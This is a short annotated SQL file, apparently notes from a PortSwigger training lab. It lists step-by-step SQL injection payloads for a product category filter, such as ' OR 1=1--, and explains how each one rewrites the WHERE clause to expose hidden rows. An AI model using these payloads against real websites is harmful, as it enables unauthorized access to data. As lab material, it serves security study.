-- PortSwigger SQLi Lab 01 — Retrieving Hidden Data
-- Target parameter: GET /filter?category=
-- Injection point: WHERE clause

-- Step 1: Test for SQL injection (trigger error)
'

-- Step 2: Comment out remaining WHERE conditions
Gifts'--

-- Step 3: Retrieve all products in one category (bypass released = 1)
Gifts' OR 1=1--

-- Step 4: Retrieve ALL products across ALL categories
' OR 1=1--

-- How the final payload modifies the query:
-- Original: SELECT * FROM products WHERE category = '' AND released = 1
-- Injected: SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
-- Result:   SELECT * FROM products WHERE category = '' OR 1=1
--           (1=1 is always true, returns every row)
